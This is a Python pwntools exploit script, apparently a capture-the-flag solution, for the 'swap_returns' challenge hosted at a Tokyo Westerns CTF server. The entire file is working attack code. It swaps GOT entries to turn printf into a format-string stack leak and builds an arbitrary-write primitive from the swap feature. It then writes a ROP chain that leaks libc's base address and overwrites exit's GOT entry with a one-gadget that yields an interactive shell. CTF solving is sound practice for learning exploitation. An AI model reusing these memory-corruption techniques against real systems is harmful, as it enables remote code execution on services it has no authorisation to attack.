#!/usr/bin/python
from pwn import *
import sys
#sys.path.append('/home/lord_idiot/CTF-Tools/python-libs')

HOST = "swap.chal.ctf.westerns.tokyo"
PORT = 37567

prev = None
stack_leak = None
stopRecv = False

def sett(a, b):
	global stopRecv
	if stopRecv:
		r.sendline("1")
		r.sendline(str(a))
		r.sendline(str(b))
		return
	else:
		r.sendlineafter("Your choice: \n", "1")
		r.sendlineafter("1st address: \n", str(a))
		r.sendlineafter("2nd address: \n", str(b))
	return

def swap():
	global stopRecv
	if stopRecv:
		r.sendline("2")
	else:
		r.sendlineafter("Your choice: \n", "2")
	return 

def lowestByte(dest, byte, secondRound=False):
	global prev
	global stack_leak
	if secondRound:
		addr2 = stack_leak+0x4a
	else:
		addr2 = stack_leak+0x32
	gadget = stack_leak+0x142
	sett(prev, 0x601200+byte)
	swap()
	sett(addr2, 0x601200+byte)
	swap()
	sett(gadget, dest)
	swap()
	prev = 0x601200+byte
	return

def write(addr, value, secondRound=False):
	global prev
	print "Writing 0x{:x} to 0x{:x}".format(value, addr)
	for i in xrange(8):
		val = value >> 8*(7-i) & 0xff

		lowestByte(0x601310, val, secondRound)
		sett(0x601310-7, 0x601400-i)
		swap()
	sett(addr, 0x601400)
	swap()


def exploit(r):
	global prev
	global stack_leak
	global stopRecv
	
	GOT_exit = 0x601018
	GOT_puts = 0x601028
	GOT_stkfail = 0x601030
	GOT_printf = 0x601038
	GOT_setvbuff = 0x601048
	GOT_atoi = 0x601050
	
	# allow printf to be called once
	r.sendlineafter("Your choice: \n", "0")

	# leak with swap atoi printf
	sett(GOT_printf, GOT_atoi)
	swap()
	r.sendafter("Your choice: \n", "%p")
	stack_leak = int(r.recvn(14), 16)
	addr1 = stack_leak+0x2a
	addr2 = stack_leak+0x32
	log.info("stack_leak : 0x{:x}".format(stack_leak))
	
	# swap back
	r.sendafter("Your choice: \n", "aa")

	# NEED THIS BECAUSE TOO SLOW IN REMOTE
	stopRecv = True

	# arbitrary write ROP chain
	prev = stack_leak+0xd2
	write(GOT_exit, 0x400a46)

	PLT_read = 0x4006d0
	rdi = 0x0000000000400a53
	rsip = 0x0000000000400a51

	ROP = []
	#leak
	ROP.append(rdi)
	ROP.append(GOT_printf)
	ROP.append(0x4006a0) #PLT_puts
	ROP.append(0x0000000004008E9) #main


	rop_start = stack_leak+0x4a
	for gadget in ROP:
		write(rop_start, gadget)
		rop_start += 8

	r.sendline("3")
	r.recvuntil("Bye. ")
	LIBC_printf = u64(r.recvline().strip("\n").ljust(8, "\x00"))
	LIBC_base = LIBC_printf - 0x56510
	log.info("LIBC_base : 0x{:x}".format(LIBC_base))


	####### SECOND ROUND #############
	write(GOT_exit, LIBC_base+0xf24cb, True)
	write(stack_leak+0x8a, 0, True)
	r.sendline("3")


	r.interactive()
	return

if __name__ == "__main__":
	elf_name = "./swap_returns"
	e = ELF(elf_name)
	
	libc_name = "./libc.so.6"
	#libc = ELF(libc_name)

	if sys.argv[-1] == "remote":
		r = remote(HOST, PORT)
		exploit(r)
	else:
		if libc_name != "":
			r = process(elf_name, env={"LD_PRELOAD" : libc_name})
		else:
			r = process(elf_name)
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)